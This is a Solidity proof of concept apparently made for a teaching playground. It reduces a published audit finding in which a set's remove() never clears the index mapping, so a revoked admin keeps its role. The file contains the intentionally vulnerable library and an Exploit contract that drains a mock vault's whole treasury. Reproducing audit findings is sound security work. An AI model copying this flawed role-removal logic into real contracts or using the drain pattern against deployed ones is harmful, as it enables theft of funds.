// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Astrolab — [H-01] Accounts not properly removed from roles upon revoking
    (Pashov Audit Group, finding #58098)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.
    Root cause: AsSequentialSet.remove() never clears index[o], while has()
    only checks index[o] > 0 && index[o] <= data.length. After removing a
    non-last member (swap-and-pop), hasRole still returns true → the revoked
    account keeps privileged access and can still drain the vault.
//////////////////////////////////////////////////////////////////////////*/

contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        require(balanceOf[from] >= amt, "bal");
        uint256 a = allowance[from][msg.sender];
        require(a >= amt, "allow");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }
}

/// @notice AsSequentialSet — reduced from Astrolab AsSequentialSet.sol
library AsSequentialSet {
    struct Set {
        bytes32[] data;
        mapping(bytes32 => uint32) index; // 1-based; 0 = absent
    }

    function add(Set storage q, bytes32 o) internal {
        if (q.index[o] != 0) return;
        q.data.push(o);
        q.index[o] = uint32(q.data.length);
    }

    function remove(Set storage q, bytes32 o) internal {
        uint32 i = q.index[o];
        // FIX: q.index[o] = 0;
        require(i > 0, "Element not found");
        removeAt(q, i - 1); // @> VULN: index[o] never cleared — has() still true after remove of non-last member
    }

    function removeAt(Set storage q, uint256 i) internal {
        require(i < q.data.length, "Index out of bounds");
        if (i < q.data.length - 1) {
            delete q.data[i];
            q.data[i] = q.data[q.data.length - 1];
        }
        q.data.pop();
    }

    function has(Set storage q, bytes32 o) internal view returns (bool) {
        return q.index[o] > 0 && q.index[o] <= q.data.length;
    }

    function length(Set storage q) internal view returns (uint256) {
        return q.data.length;
    }
}

/// @notice Role-gated vault. DEFAULT_ADMIN can drain treasury.
contract RoleVault {
    using AsSequentialSet for AsSequentialSet.Set;

    bytes32 public constant DEFAULT_ADMIN_ROLE = 0x00;

    struct RoleData {
        AsSequentialSet.Set members;
    }

    mapping(bytes32 => RoleData) private _roles;
    MockToken public immutable token;

    constructor(MockToken _token, address initialAdmin) {
        token = _token;
        _roles[DEFAULT_ADMIN_ROLE].members.add(bytes32(uint256(uint160(initialAdmin))));
    }

    function hasRole(bytes32 role, address account) public view returns (bool) {
        return _roles[role].members.has(bytes32(uint256(uint160(account))));
    }

    function grantRole(bytes32 role, address account) external {
        require(hasRole(DEFAULT_ADMIN_ROLE, msg.sender), "not admin");
        _roles[role].members.add(bytes32(uint256(uint160(account))));
    }

    function revokeRole(bytes32 role, address account) external {
        require(hasRole(DEFAULT_ADMIN_ROLE, msg.sender), "not admin");
        if (hasRole(role, account)) {
            _roles[role].members.remove(bytes32(uint256(uint160(account))));
        }
    }

    function adminWithdraw(address to, uint256 amount) external {
        require(hasRole(DEFAULT_ADMIN_ROLE, msg.sender), "not admin");
        require(token.transfer(to, amount), "xfer");
    }

    function memberCount(bytes32 role) external view returns (uint256) {
        return _roles[role].members.length();
    }
}

/// @dev Bootstrap so OldAdmin can be CREATE'd before the vault exists, then bound.
contract OldAdmin {
    RoleVault public vault;

    function bind(RoleVault v) external {
        require(address(vault) == address(0), "bound");
        vault = v;
    }

    function grant(address who) external {
        vault.grantRole(vault.DEFAULT_ADMIN_ROLE(), who);
    }

    function revokeSelf() external {
        vault.revokeRole(vault.DEFAULT_ADMIN_ROLE(), address(this));
    }

    function drain(address to, uint256 amount) external {
        vault.adminWithdraw(to, amount);
    }
}

/// CREATE order: token (1), oldAdmin (2), vault (3, initial admin = oldAdmin).
contract Exploit {
    MockToken public token;
    RoleVault public vault;
    OldAdmin public oldAdmin;

    address public constant NEW_ADMIN = address(0xA11CE);

    bool public stillHasRole;
    uint256 public stolen;

    constructor() {
        token = new MockToken(); // nonce 1
        oldAdmin = new OldAdmin(); // nonce 2
        // OldAdmin is first set member (index 1).
        vault = new RoleVault(token, address(oldAdmin)); // nonce 3
        oldAdmin.bind(vault);
    }

    function run() external {
        token.mint(address(vault), 1000 ether);

        // OldAdmin is sole admin (index 1). Add NEW_ADMIN as second member.
        oldAdmin.grant(NEW_ADMIN);
        require(vault.hasRole(vault.DEFAULT_ADMIN_ROLE(), address(oldAdmin)), "old admin");
        require(vault.hasRole(vault.DEFAULT_ADMIN_ROLE(), NEW_ADMIN), "new admin");
        require(vault.memberCount(vault.DEFAULT_ADMIN_ROLE()) == 2, "two admins");

        // Ownership handoff: revoke the old admin (first set member).
        oldAdmin.revokeSelf();

        // VULN: index not cleared → hasRole still true for old admin.
        stillHasRole = vault.hasRole(vault.DEFAULT_ADMIN_ROLE(), address(oldAdmin));
        require(stillHasRole, "role should still stick (bug)");

        // Harm: revoked admin still drains the entire treasury.
        oldAdmin.drain(address(oldAdmin), 1000 ether);
        stolen = token.balanceOf(address(oldAdmin));
        require(stolen == 1000 ether, "harm not demonstrated");
        require(token.balanceOf(address(vault)) == 0, "vault emptied");
    }
}
